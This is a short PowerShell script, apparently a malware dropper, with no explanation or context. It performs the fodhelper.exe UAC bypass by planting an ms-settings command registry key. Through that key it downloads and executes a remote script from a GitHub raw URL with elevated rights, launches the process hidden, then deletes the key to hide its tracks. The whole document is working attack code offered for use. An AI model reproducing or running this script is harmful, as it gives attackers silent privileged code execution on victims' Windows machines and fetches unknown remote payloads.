Start-Sleep 3
function ffv {
    $Key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $Key -Force
    New-ItemProperty -Path $Key -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $Key -Name "(default)" -Value "iex (irm https://raw.githubusercontent.com/petergriuffin123/feg/refs/heads/main/feg.ps1)" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
ffv  
